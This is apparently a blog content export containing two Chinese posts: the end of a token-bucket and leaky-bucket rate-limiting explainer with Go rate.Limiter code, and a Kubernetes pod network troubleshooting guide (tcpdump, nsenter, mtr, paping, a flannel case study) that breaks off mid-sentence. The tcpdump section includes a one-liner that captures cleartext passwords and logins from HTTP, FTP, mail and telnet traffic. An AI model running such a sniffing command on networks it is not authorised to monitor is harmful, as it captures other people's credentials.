$\\frac{1}{3}$ $\\frac{2}{3}$ 如果一个数据包在桶中没有足够的令牌来发送它时到达，可以进行整形或管制，整形使数据包等到足够的令牌积累。管制会丢弃数据包。或者发送方可以立即发送数据包，但将其标记为不合规。\nPrinciple of leaky bucket 漏桶 （leaky bucket）是一种临时存储可变数量的请求并将它们组织成设定速率输出的数据包的方法。漏桶的概念与令牌桶比起是相反的，漏桶可以理解为是一个具有恒定服务时间的队列。\n由下图可以看出，漏桶的概念是一个底部有孔的桶。无论水进入桶的速度是多少，它都会以恒定的速度通过孔从桶中泄漏出来。如果桶中没有水，则流速为零，如果桶已满，则多余的水溢出并丢失。\n和令牌桶一样，漏桶用于流量整形和流量管制\nDifference between Token and Leaky Leaky Token 桶中存放的是所有到达的数据包，必须入桶 桶中存放的是定期生成的令牌 桶以恒定速率泄漏 桶有最大容量 $B_{max}$ 突发流量入桶转换为恒定流量发送 发送数据包需要小号对应的token token较leaky的优势：\n在令牌桶中，如果桶已满，处理的方式有 shaping和policing两种模型三种方式（延迟、丢弃、标记），而漏桶中的流量仅为shaping。 通俗来说，就是令牌桶已满，丢弃的是令牌，漏桶中丢弃的则是数据包 令牌桶可以更快的速率发送大突发流量，而漏桶仅是恒定速率 Implementation with go Token 在golang中，内置的 rate 包实现了一个令牌桶算法，通过 rate.NewLimiter(r,B) 进行构造。与公式$TB(r,B_{max})$ 意思相同。\ntype Limiter struct { limit Limit // 向桶中放置令牌的速率 burst int // 桶的容量 mu sync.Mutex tokens float64 // 可用令牌容量 last time.Time // 上次放入token的时间 lastEvent time.Time } Limiter中带有三种方法， Allow、Reserve、Wait 分别表示Token Bucket中的 shaping 和 policing：\nAllow：丢弃超过速率的事件，类似 drop Wait：等待，直到获取到令牌或者取消或deadline/timeout Reserve：等待或减速，不丢弃事件，类似于 delay Reserve/ReserveN Reserve() 返回了 ReserveN(time.Now(), 1) ReserveN() 无论如何都会返回一个 Reservation，指定了调用者在 n 个事件发生之前必须等待多长时间。 Reservation 是一个令牌桶事件信息 Reservation 中的 Delay() 方法返回了需要等待的时间，如果时间为0则不需要等待 Reservation 中的 Cancel() 将取消等待 wait/waitN\nAllow/AllowN 在获取不到令牌是丢弃对应的事件 返回的是一个 reserveN() 拿到token是合规的，并消耗掉token AllowN 为截止到某一时刻，当前桶内桶中数目是否至少为 n 个，满足则返回 true，同时从桶中消费 n 个 token。反之不消费 Token，false。\nfunc (lim *Limiter) AllowN(now time.Time, n int) bool { return lim.reserveN(now, n, 0).ok // 由于仅需要一个合规否，顾合规的通过，不合规的丢弃 } reserveN() 是三个行为的核心，AllowN中指定的为 0 ，因为 maxFutureReserve 是最大的等待时间，AllowN给定的是0，即如果突发大的情况下丢弃额外的 Bc。\nfunc (lim *Limiter) reserveN(now time.Time, n int, maxFutureReserve time.Duration) Reservation { lim.mu.Lock() if lim.limit == Inf { lim.mu.Unlock() return Reservation{ ok: true, lim: lim, tokens: n, timeToAct: now, } } // 这里拿到的是now，上次更新token时间和桶内token数量 now, last, tokens := lim.advance(now) // 计算剩余的token tokens -= float64(n) // Calculate the wait duration var waitDuration time.Duration if tokens \u0026lt; 0 { waitDuration = lim.limit.durationFromTokens(-tokens) } // 确定是否合规，n是token // token 的数量要小于桶的容量，并且 等待时间小于最大等待时间 ok := n \u0026lt;= lim.burst \u0026amp;\u0026amp; waitDuration \u0026lt;= maxFutureReserve // Prepare reservation r := Reservation{ ok: ok, lim: lim, limit: lim.limit, } if ok { r.tokens = n r.timeToAct = now.Add(waitDuration) } // Update state if ok { lim.last = now lim.tokens = tokens lim.lastEvent = r.timeToAct } else { lim.last = last } lim.mu.Unlock() return r } 在reserveN中调用了一个 advance() 函数，\nfunc (lim *Limiter) advance(now time.Time) (newNow time.Time, newLast time.Time, newTokens float64) { last := lim.last if now.Before(last) { // 计算上次放入token是否在传入now之前 last = now } // 当 last 很旧时，避免在下面进行 delta 溢出。 // maxElapsed 计算装满需要多少时间 maxElapsed := lim.limit.durationFromTokens(float64(lim.burst) - lim.tokens) elapsed := now.Sub(last) // 上次装入到现在的时差 if elapsed \u0026gt; maxElapsed { // 上次如果放入token时间超长，就让他与装满时间相等 elapsed = maxElapsed // 即，让桶为满的 } // 装桶的动作，下面函数表示，elapsed时间内可以生成多少个token delta := lim.limit.tokensFromDuration(elapsed) tokens := lim.tokens + delta // 当前的token if burst := float64(lim.burst); tokens \u0026gt; burst { tokens = burst // 这里表示token溢出，让他装满就好 } return now, last, tokens } wait/waitN 桶内令牌可以\u0026gt;N时，返回，在获取不到令牌是阻塞，等待context取消或者超时 返回的是一个 reserveN() 拿到token是合规的，并消耗掉token func (lim *Limiter) WaitN(ctx context.Context, n int) (err error) { if n \u0026gt; lim.burst \u0026amp;\u0026amp; lim.limit != Inf { return fmt.Errorf(\u0026quot;rate: Wait(n=%d) exceeds limiter's burst %d\u0026quot;, n, lim.burst) } // 外部已取消 select { case \u0026lt;-ctx.Done(): return ctx.Err() default: } // Determine wait limit now := time.Now() waitLimit := InfDuration if deadline, ok := ctx.Deadline(); ok { waitLimit = deadline.Sub(now) } // 三个方法的核心，这里给定了deatline r := lim.reserveN(now, n, waitLimit) if !r.ok { return fmt.Errorf(\u0026quot;rate: Wait(n=%d) would exceed context deadline\u0026quot;, n) } // Wait if necessary delay := r.DelayFrom(now) if delay == 0 { return nil } t := time.NewTimer(delay) defer t.Stop() select { case \u0026lt;-t.C: // We can proceed. return nil case \u0026lt;-ctx.Done(): // Context was canceled before we could proceed. Cancel the // reservation, which may permit other events to proceed sooner. r.Cancel() return ctx.Err() } } Dynamic Adjustment 在 rate.limiter 中，支持调整速率和桶大小，这样就可以根据现有环境和条件，来动态的改变 Token生成速率和桶容量\nSetLimit(Limit) 更改生成 Token 的速率 SetBurst(int) 改变桶容量 Example 一个流量整形的场景 package main import ( \u0026quot;log\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;time\u0026quot; \u0026quot;golang.org/x/time/rate\u0026quot; ) func main() { timeLayout := \u0026quot;2006-01-02:15:04:05.0000\u0026quot; limiter := rate.NewLimiter(1, 5) // BT(1,5) log.Println(\u0026quot;bucket current capacity: \u0026quot; + strconv.Itoa(limiter.Burst())) length := 20 // 一共请求20次 chs := make([]chan string, length) for i := 0; i \u0026lt; length; i++ { chs[i] = make(chan string, 1) go func(taskId string, ch chan string, r *rate.Limiter) { err := limiter.Allow() if !err { ch \u0026lt;- \u0026quot;Task-\u0026quot; + taskId + \u0026quot; unallow \u0026quot; + time.Now().Format(timeLayout) } time.Sleep(time.Duration(5) * time.Millisecond) ch \u0026lt;- \u0026quot;Task-\u0026quot; + taskId + \u0026quot; run success \u0026quot; + time.Now().Format(timeLayout) return }(strconv.FormatInt(int64(i), 10), chs[i], limiter) } for _, ch := range chs { log.Println(\u0026quot;task start at \u0026quot; + \u0026lt;-ch) } } 通过执行结果可以看出，在突发为20的情况下，allow仅允许了获得token的事件执行，，这种场景下实现了流量整形的特性。\n一个流量管制的场景 package main import ( \u0026quot;context\u0026quot; \u0026quot;log\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;time\u0026quot; \u0026quot;golang.org/x/time/rate\u0026quot; ) func main() { timeLayout := \u0026quot;2006-01-02:15:04:05.0000\u0026quot; limiter := rate.NewLimiter(1, 5) // BT(1,5) log.Println(\u0026quot;bucket current capacity: \u0026quot; + strconv.Itoa(limiter.Burst())) length := 20 // 一共请求20次 chs := make([]chan string, length) for i := 0; i \u0026lt; length; i++ { chs[i] = make(chan string, 1) go func(taskId string, ch chan string, r *rate.Limiter) { err := limiter.Wait(context.TODO()) if err != nil { ch \u0026lt;- \u0026quot;Task-\u0026quot; + taskId + \u0026quot; unallow \u0026quot; + time.Now().Format(timeLayout) } ch \u0026lt;- \u0026quot;Task-\u0026quot; + taskId + \u0026quot; run success \u0026quot; + time.Now().Format(timeLayout) return }(strconv.FormatInt(int64(i), 10), chs[i], limiter) } for _, ch := range chs { log.Println(\u0026quot;task start at \u0026quot; + \u0026lt;-ch) } } 结果可以看出，在大突发的情况下，在拿到token的任务会立即执行，没有拿到token的会等待拿到token后继续执行，这种场景下实现了流量管制的特性\nReference tokenbucket QoS Policing ","permalink":"https://www.oomkill.com/2022/08/ch10-token-bucket-algorithm/","summary":"","title":"漏桶算法与令牌桶算法"},{"content":"Overview 本文将引入一个思路：“在Kubernetes集群发生网络异常时如何排查”。文章将引入Kubernetes 集群中网络排查的思路，包含网络异常模型，常用工具，并且提出一些案例以供学习。\nPod常见网络异常分类 网络排查工具 Pod网络异常排查思路及流程模型 CNI网络异常排查步骤 案例学习 Pod网络异常 网络异常大概分为如下几类：\n网络不可达，主要现象为ping不通，其可能原因为：\n源端和目的端防火墙（iptables, selinux）限制 网络路由配置不正确 源端和目的端的系统负载过高，网络连接数满，网卡队列满 网络链路故障 端口不可达：主要现象为可以ping通，但telnet端口不通，其可能原因为：\n源端和目的端防火墙限制 源端和目的端的系统负载过高，网络连接数满，网卡队列满，端口耗尽 目的端应用未正常监听导致（应用未启动，或监听为127.0.0.1等） DNS解析异常：主要现象为基础网络可以连通，访问域名报错无法解析，访问IP可以正常连通。其可能原因为\nPod的DNS配置不正确 DNS服务异常 pod与DNS服务通讯异常 大数据包丢包：主要现象为基础网络和端口均可以连通，小数据包收发无异常，大数据包丢包。可能原因为：\n数据包的大小超过了 dockero，CNI 插件，或者宿主机网卡的 MTU 值。 可使用 ping -s 指定数据包大小进行测试 CNI异常：主要现象为Node可以通，但Pod无法访问集群地址，可能原因有：\nkube-proxy 服务异常，没有生成 iptables 策略或者 ipvs 规则导致无法访问 CIDR耗尽，无法为Node注入 PodCIDR 导致 CNI 插件异常 其他 CNI 插件问题 那么整个Pod网络异常分类可以如下图所示：\n图：Pod network trouble hirarchy\n总结一下，Pod最常见的网络故障有，网络不可达（ping不通）；端口不可达（telnet不通）；DNS解析异常（域名不通）与大数据包丢失（大包不通）。\n常用网络排查工具 在了解到常见的网络异常后，在排查时就需要使用到一些网络工具才可以很有效的定位到网络故障原因，下面会介绍一些网络排查工具。\ntcpdump [1] tcpdump网络嗅探器，将强大和简单结合到一个单一的命令行界面中，能够将网络中的报文抓取，输出到屏幕或者记录到文件中。\n各系统下的安装\nUbuntu/Debian: tcpdump ；apt-get install -y tcpdump Centos/Fedora: tcpdump ；yum install -y tcpdump Apline：tcpdump ；apk add tcpdump --no-cache 查看指定接口上的所有通讯\n语法\n参数 说明 -i [interface] -w [flle] 第一个n表示将地址解析为数字格式而不是主机名，第二个N表示将端口解析为数字格式而不是服务名 -n 不显示IP地址 -X hex and ASCII -A ASCII（实际上是以人类可读懂的包进行显示） -XX -v 详细信息 -r 读取文件而不是实时抓包 关键字 type host（主机名，域名，IP地址）, net, port, portrange direction src, dst, src or dst , src and ds protocol ether, ip，arp, tcp, udp, wlan 捕获所有网络接口 tcpdump -D ####按IP查找流量\n最常见的查询之一 host，可以看到来往于 1.1.1.1 的流量。\ntcpdump host 1.1.1.1 ####按源/目的 地址过滤\n如果只想查看来自/向某方向流量，可以使用 src 和 dst。\ntcpdump src|dst 1.1.1.1 通过网络查找数据包 使用 net 选项，来要查找出/入某个网络或子网的数据包。\ntcpdump net 1.2.3.0/24 使用十六进制输出数据包内容 hex 可以以16进制输出包的内容\ntcpdump -c 1 -X icmp 查看特定端口的流量 使用 port 选项来查找特定的端口流量。\ntcpdump port 3389 tcpdump src port 1025 查找端口范围的流量 tcpdump portrange 21-23 过滤包的大小 如果需要查找特定大小的数据包，可以使用以下选项。你可以使用 less，greater。\ntcpdump less 32 tcpdump greater 64 tcpdump \u0026lt;= 128 捕获流量输出为文件 -w 可以将数据包捕获保存到一个文件中以便将来进行分析。这些文件称为PCAP（PEE-cap）文件，它们可以由不同的工具处理，包括 Wireshark 。\ntcpdump port 80 -w capture_file 组合条件 tcpdump也可以结合逻辑运算符进行组合条件查询\nAND and or \u0026amp;\u0026amp;\nOR or or ||\nEXCEPT not or !\ntcpdump -i eth0 -nn host 220.181.57.216 and 10.0.0.1 # 主机之间的通讯 tcpdump -i eth0 -nn host 220.181.57.216 or 10.0.0.1 # 获取10.0.0.1与 10.0.0.9或 10.0.0.1 与10.0.0.3之间的通讯 tcpdump -i eth0 -nn host 10.0.0.1 and \\(10.0.0.9 or 10.0.0.3\\) 原始输出 并显示人类可读的内容进行输出包（不包含内容）。\ntcpdump -ttnnvvS -i eth0 tcpdump -ttnnvvS -i eth0 IP到端口 让我们查找从某个IP到端口任何主机的某个端口所有流量。\ntcpdump -nnvvS src 10.5.2.3 and dst port 3389 去除特定流量 可以将指定的流量排除，如这显示所有到192.168.0.2的 非ICMP的流量。\ntcpdump dst 192.168.0.2 and src net and not icmp 来自非指定端口的流量，如，显示来自不是SSH流量的主机的所有流量。\ntcpdump -vv src mars and not dst port 22 选项分组 在构建复杂查询时，必须使用单引号 '。单引号用于忽略特殊符号 () ，以便于使用其他表达式（如host, port, net等）进行分组。\ntcpdump 'src 10.0.2.4 and (dst port 3389 or 22)' 过滤TCP标记位 TCP RST\nThe filters below find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on.\ntcpdump 'tcp[13] \u0026amp; 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst' TCP SYN\ntcpdump 'tcp[13] \u0026amp; 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn' 同时忽略SYN和ACK标志的数据包\ntcpdump 'tcp[13]=18' TCP URG\ntcpdump 'tcp[13] \u0026amp; 32!=0' tcpdump 'tcp[tcpflags] == tcp-urg' TCP ACK\ntcpdump 'tcp[13] \u0026amp; 16!=0' tcpdump 'tcp[tcpflags] == tcp-ack' TCP PSH\ntcpdump 'tcp[13] \u0026amp; 8!=0' tcpdump 'tcp[tcpflags] == tcp-push' TCP FIN\ntcpdump 'tcp[13] \u0026amp; 1!=0' tcpdump 'tcp[tcpflags] == tcp-fin' 查找http包 查找 user-agent 信息\ntcpdump -vvAls0 | grep 'User-Agent:' 查找只是 GET 请求的流量\ntcpdump -vvAls0 | grep 'GET' 查找http客户端IP\ntcpdump -vvAls0 | grep 'Host:' 查询客户端cookie\ntcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:' 查找DNS流量 tcpdump -vvAs0 port 53 查找对应流量的明文密码 tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' wireshark追踪流 wireshare追踪流可以很好的了解出在一次交互过程中都发生了那些问题。\nwireshare选中包，右键选择 “追踪流“ 如果该包是允许的协议是可以打开该选项的\n关于抓包节点和抓包设备 如何抓取有用的包，以及如何找到对应的接口，有以下建议\n抓包节点：\n通常情况下会在==源端==和==目的端==两端同时抓包，观察数据包是否从源端正常发出，目的端是否接收到数据包并给源端回包，以及源端是否正常接收到回包。如果有丢包现象，则沿网络链路上各节点抓包排查。例如，A节点经过c节点到B节点，先在AB两端同时抓包，如果B节点未收到A节点的包，则在c节点同时抓包。\n抓包设备：\n对于 Kubernetes 集群中的Pod，由于容器内不便于抓包，通常视情况在Pod数据包经过的veth设备，docker0 网桥，CNI 插件设备（如cni0，flannel.1 etc..）及Pod所在节点的网卡设备上指定Pod IP进行抓包。选取的设备根据怀疑导致网络问题的原因而定，比如范围由大缩小，从源端逐渐靠近目的端，比如怀疑是 CNI 插件导致，则在 CNI 插件设备上抓包。从pod发出的包逐一经过veth设备，cni0 设备，flannel0，宿主机网卡，到达对端，抓包时可按顺序逐一抓包，定位问题节点。\n需要注意在不同设备上抓包时指定的源目IP地址需要转换，如抓取某Pod时，ping {host} 的包，在 veth 和 cni0 上可以指定 Pod IP抓包，而在宿主机网卡上如果仍然指定Pod IP会发现抓不到包，因为此时Pod IP已被转换为宿主机网卡IP。\n下图是一个使用 VxLAN 模式的 flannel 的跨界点通讯的网络模型，在抓包时需要注意对应的网络接口\n图：VxLAN in kubernetes\nnsenter nsenter是一款可以进入进程的名称空间中。例如，如果一个容器以非 root 用户身份运行，而使用 docker exec 进入其中后，但该容器没有安装 sudo 或未 netstat ，并且您想查看其当前的网络属性，如开放端口，这种场景下将如何做到这一点？nsenter 就是用来解决这个问题的。\nnsenter (namespace enter) 可以在容器的宿主机上使用 nsenter 命令进入容器的命名空间，以容器视角使用宿主机上的相应网络命令进行操作。==当然需要拥有 root 权限==\n各系统下的安装 [2]\nUbuntu/Debian: util-linux ；apt-get install -y util-linux Centos/Fedora: util-linux ；yum install -y util-linux Apline：util-linux ；apk add util-linux --no-cache nsenter 的使用语法为，nsenter -t pid -n \u0026lt;commond\u0026gt;，-t 接 进程ID号，-n 表示进入名称空间内，\u0026lt;commond\u0026gt; 为执行的命令。更多的内容可以参考 [3]\n实例：如我们有一个Pod进程ID为30858，进入该Pod名称空间内执行 ifconfig ，如下列所示\n$ ps -ef|grep tail root 17636 62887 0 20:19 pts/2 00:00:00 grep --color=auto tail root 30858 30838 0 15:55 ? 00:00:01 tail -f $ nsenter -t 30858 -n ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1480 inet 192.168.1.213 netmask 255.255.255.0 broadcast 192.168.1.255 ether 5e:d5:98:af:dc:6b txqueuelen 0 (Ethernet) RX packets 92 bytes 9100 (8.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 92 bytes 8422 (8.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 5 bytes 448 (448.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5 bytes 448 (448.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 net1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.1.0.201 netmask 255.255.255.0 broadcast 10.1.0.255 ether b2:79:f9:dd:2a:10 txqueuelen 0 (Ethernet) RX packets 228 bytes 21272 (20.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 216 bytes 20272 (19.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 如何定位Pod名称空间 首先需要确定Pod所在的节点名称\n$ kubectl get pods -owide |awk '{print $1,$7}' NAME NODE netbox-85865d5556-hfg6v master-machine netbox-85865d5556-vlgr4 node01 如果Pod不在当前节点还需要用IP登录则还需要查看IP（可选）\n$ kubectl get pods -owide |awk '{print $1,$6,$7}' NAME IP NODE netbox-85865d5556-hfg6v 192.168.1.213 master-machine netbox-85865d5556-vlgr4 192.168.0.4 node01 接下来，登录节点，获取容器lD，如下列所示，每个pod默认有一个 pause 容器，其他为用户yaml文件中定义的容器，理论上所有容器共享相同的网络命名空间，排查时可任选一个容器。\n$ docker ps |grep netbox-85865d5556-hfg6v 6f8c58377aae f78dd05f11ff \u0026quot;tail -f\u0026quot; 45 hours ago Up 45 hours k8s_netbox_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0 b9c732ee457e registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 \u0026quot;/pause\u0026quot; 45 hours ago Up 45 hours k8s_POD_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0 接下来获得获取容器在节点系统中对应的进程号，如下所示\n$ docker inspect --format \u0026quot;{{ .State.Pid }}\u0026quot; 6f8c58377aae 30858 最后就可以通过 nsenter 进入容器网络空间执行命令了\npaping paping 命令可对目标地址指定端口以TCP协议进行连续ping，通过这种特性可以弥补 ping ICMP协议，以及 nmap , telnet 只能进行一次操作的的不足；通常情况下会用于测试端口连通性和丢包率\npaping download：paping\npaping 还需要安装以下依赖，这取决于你安装的 paping 版本\nRedHat/CentOS：yum install -y libstdc++.i686 glibc.i686 Ubuntu/Debian：最小化安装无需依赖 $ paping -h paping v1.5.5 - Copyright (c) 2011 Mike Lovell Syntax: paping [options] destination Options: -?, --help display usage -p, --port N set TCP port N (required) --nocolor Disable color output -t, --timeout timeout in milliseconds (default 1000) -c, --count N set number of checks to N mtr mtr 是一个跨平台的网络诊断工具，将 traceroute 和 ping 的功能结合到一个工具。与 traceroute 不同的是 mtr 显示的信息比起 traceroute 更加丰富：通过 mtr 可以确定网络的条数，并且可以同时打印响应百分比以及网络中各跳跃点的响应时间。\n各系统下的安装 [2]\nUbuntu/Debian: mtr ；apt-get install -y mtr Centos/Fedora: mtr ；yum install -y mtr Apline：mtr ；apk add mtr --no-cache 简单的使用示例 最简单的示例，就是后接域名或IP，这将跟踪整个路由\n$ mtr google.com Start: Thu Jun 28 12:10:13 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.7 0.9 0.7 1.3 0.0 3.|-- 209.snat-111-91-120.hns.n 80.0% 5 7.1 7.1 7.1 7.1 0.0 4.|-- 72.14.194.226 0.0% 5 1.9 2.9 1.9 4.4 1.1 5.|-- 108.170.248.161 0.0% 5 2.9 3.5 2.0 4.3 0.7 6.|-- 216.239.62.237 0.0% 5 3.0 6.2 2.9 18.3 6.7 7.|-- bom05s12-in-f14.1e100.net 0.0% 5 2.1 2.4 2.0 3.8 0.5 -n 强制 mtr 打印 IP地址而不是主机名\n$ mtr -n google.com Start: Thu Jun 28 12:12:58 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.9 0.9 0.8 1.1 0.0 3.|-- ??? 100.0 5 0.0 0.0 0.0 0.0 0.0 4.|-- 72.14.194.226 0.0% 5 2.0 2.0 1.9 2.0 0.0 5.|-- 108.170.248.161 0.0% 5 2.3 2.3 2.2 2.4 0.0 6.|-- 216.239.62.237 0.0% 5 3.0 3.2 3.0 3.3 0.0 7.|-- 172.217.160.174 0.0% 5 3.7 3.6 2.0 5.3 1.4 -b 同时显示IP地址与主机名\n$ mtr -b google.com Start: Thu Jun 28 12:14:36 2018 HOST: TecMint Loss% Snt Last Avg Best Wrst StDev 1.|-- 192.168.0.1 0.0% 5 0.3 0.3 0.3 0.4 0.0 2.|-- 5.5.5.211 0.0% 5 0.7 0.8 0.6 1.0 0.0 3.|-- 209.snat-111-91-120.hns.n 0.0% 5 1.4 1.6 1.3 2.1 0.0 4.|-- 72.14.194.226 0.0% 5 1.8 2.1 1.8 2.6 0.0 5.|-- 108.170.248.209 0.0% 5 2.0 1.9 1.8 2.0 0.0 6.|-- 216.239.56.115 0.0% 5 2.4 2.7 2.4 2.9 0.0 7.|-- bom07s15-in-f14.1e100.net 0.0% 5 3.7 2.2 1.7 3.7 0.9 -c 跟一个具体的值，这将限制 mtr ping的次数，到达次数后会退出\n$ mtr -c5 google.com 如果需要指定次数，并且在退出后保存这些数据，使用 -r flag\n$ mtr -r -c 5 google.com \u0026gt; 1 $ cat 1 Start: Sun Aug 21 22:06:49 2022 HOST: xxxxx.xxxxx.xxxx.xxxx Loss% Snt Last Avg Best Wrst StDev 1.|-- gateway 0.0% 5 0.6 146.8 0.6 420.2 191.4 2.|-- 212.xx.21.241 0.0% 5 0.4 1.0 0.4 2.3 0.5 3.|-- 188.xxx.106.124 0.0% 5 0.7 1.1 0.7 2.1 0.5 4.|-- ??? 100.0 5 0.0 0.0 0.0 0.0 0.0 5.|-- 72.14.209.89 0.0% 5 43.2 43.3 43.1 43.3 0.0 6.|-- 108.xxx.250.33 0.0% 5 43.2 43.1 43.1 43.2 0.0 7.|-- 108.xxx.250.34 0.0% 5 43.7 43.6 43.5 43.7 0.0 8.|-- 142.xxx.238.82 0.0% 5 60.6 60.9 60.6 61.2 0.0 9.|-- 142.xxx.238.64 0.0% 5 59.7 67.5 59.3 89.8 13.2 10.|-- 142.xxx.37.81 0.0% 5 62.7 62.9 62.6 63.5 0.0 11.|-- 142.xxx.229.85 0.0% 5 61.0 60.9 60.7 61.3 0.0 12.|-- xx-in-f14.1e100.net 0.0% 5 59.0 58.9 58.9 59.0 0.0 默认使用的是 ICMP 协议 -i ，可以指定 -u, -t 使用其他协议\nmtr --tcp google.com -m 指定最大的跳数\nmtr -m 35 216.58.223.78 -s 指定包的大小\nmtr输出的数据 colum describe last 最近一次的探测延迟值 avg 探测延迟的平均值 best 探测延迟的最小值 wrst 探测延迟的最大值 stdev 标准偏差。越大说明相应节点越不稳定 丢包判断 任一节点的 Loss%（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种。\n运营商基于安全或性能需求，人为限制了节点的ICMP发送速率，导致丢包。 节点确实存在异常，导致丢包。可以结合异常节点及其后续节点的丢包情况，来判定丢包原因。 Notes:\n如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。 如果随后节点也出现丢包，则通常说明节点确实存在网络异常，导致丢包。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如链路测试在第5、6、7跳均出现了丢包。最终丢包情况以第7跳作为参考。 延迟判断 由于链路抖动或其它因素的影响，节点的 Best 和 Worst 值可能相差很大。而 Avg（平均值）统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。而 StDev（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以标准偏差值可用于协助判断 Avg 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以此时 Avg 并不能很好的反应出实际的网络质量情况。\n这就需要结合如下情况进行判断：\n如果 StDev 很高，则同步观察相应节点的 Best 和 wrst，来判断相应节点是否存在异常。 如果StDev 不高，则通过Avg来判断相应节点是否存在异常。 Tips：对于更多的网络工具的使用可以参考这篇文章\nPod网络排查流程 Pod网络异常时排查思路，可以按照下图所示\n图：Pod network exception troubleshooting idea\n案例学习 扩容节点访问service地址不通 测试环境k8s节点扩容后无法访问集群clusterlP类型的registry服务\n环境信息：\nIP Hostname role 10.153.204.15 yxxx-xxx-xxxfu12 worknode节点（本次扩容的问题节点） 10.153.203.14 yxxx-xxx-xxxxfu31 master节点 10.61.187.42 yxxx-xxx-xxxxxxxxf8e9 master节点 10.61.187.48 yxxx-xxx-xxxxxx61e25 master节点（本次registry服务pod所在节点） cni插件：flannel vxlan\nkube-proxy工作模式为iptables\nregistry服务\n单实例部署在10.61.187.48:5000 Pod IP：10.233.65.46， Cluster IP：10.233.0.100 现象：\n所有节点之间的pod通信正常\n任意节点和Pod curl registry的Pod 的 IP:5000 均可以连通\n新扩容节点10.153.204.15 curl registry服务的 Cluster lP 10.233.0.100:5000不通，其他节点curl均可以连通\n分析思路：\n根据现象1可以初步判断 CNI 插件无异常\n根据现象2可以判断 registry 的 Pod 无异常\n根据现象3可以判断 registry 的 service 异常的可能性不大，可能是新扩容节点访问 registry 的 service 存在异常\n怀疑方向：\n问题节点的kube-proxy存在异常 问题节点的iptables规则存在异常 问题节点到service的网络层面存在异常 排查过程：\n排查问题节点的 kube-proxy 执行 kubectl get pod -owide -nkube-system l grep kube-proxy 查看 kube-proxy Pod的状态，问题节点上的 kube-proxy Pod为 running 状态 执行 kubecti logs \u0026lt;nodename\u0026gt; \u0026lt;kube-proxy pod name\u0026gt; -nkube-system 查看问题节点 kube-proxy的Pod日志，没有异常报错 在问题节点操作系统上执行 iptables -S -t nat 查看 iptables 规则 排查过程：\n确认存在到 registry 服务的 Cluster lP 10.233.0.100 的 KUBE-SERVICES 链，跳转至 KUBE-SVC-* 链做负载均衡，再跳转至 KUBE-SEP-* 链通过 DNAT 替换为服务后端Pod的IP 10.233.65.46。因此判断iptables规则无异常执行route-n查看问题节点存在访问10.233.65.46所在网段的路由，如图所示\n图：10.233.65.46路由\n查看对端的回程路由\n图：回程路由\n以上排查证明问题原因不是 cni 插件或者 kube-proxy 异常导致，因此需要在访问链路上抓包，判断问题原因、问题节点执行 curl 10.233.0.100:5000，在问题节点和后端pod所在节点的flannel.1上同时抓包发包节点一直在重传，Cluster lP已 DNAT 转换为后端Pod IP，如图所示\n图：抓包过程，发送端\n后端Pod（ registry 服务）所在节点的 flannel.1 上未抓到任何数据包，如图所示\n图：抓包过程，服务端\n请求 service 的 ClusterlP 时，在两端物理机网卡抓包，发包端如图所示，封装的源端节点IP是10.153.204.15，但一直在重传\n图：包传送过程，发送端\n收包端收到了包，但未回包，如图所示\n图：包传送过程，服务端\n由此可以知道，NAT的动作已经完成，而只是后端Pod（ registry 服务）没有回包，接下来在问题节点执行 curl 10.233.65.46:5000，在问题节点和后端（ registry 服务）Pod所在节点的 flannel.1 上同时抓包，两节点收发正常，发包如图所示\n图：正常包发送端\n图：正常包接收端\n接下来在两端物理机网卡接口抓包，因为数据包通过物理机网卡会进行 vxlan 封装，需要抓 vxlan 设备的8472端口，发包端如图所示\n发现网络链路连通，==但封装的IP不对==，封装的源端节点IP是10.153.204.228，但是存在问题节点的IP是10.153.204.15\n图：问题节点物理机网卡接口抓包\n后端Pod所在节点的物理网卡上抓包，注意需要过滤其他正常节点的请求包，如图所示；发现收到的数据包，源地址是10.153.204.228，但是问题节点的IP是10.153.204.15。\n图：对端节点物理机网卡接口抓包\n此时问题以及清楚了，是一个Pod存在两个IP，导致发包和回包时无法通过隧道设备找到对端的接口，所以发可以收到，但不能回。\n问题节点执行ip addr，发现网卡 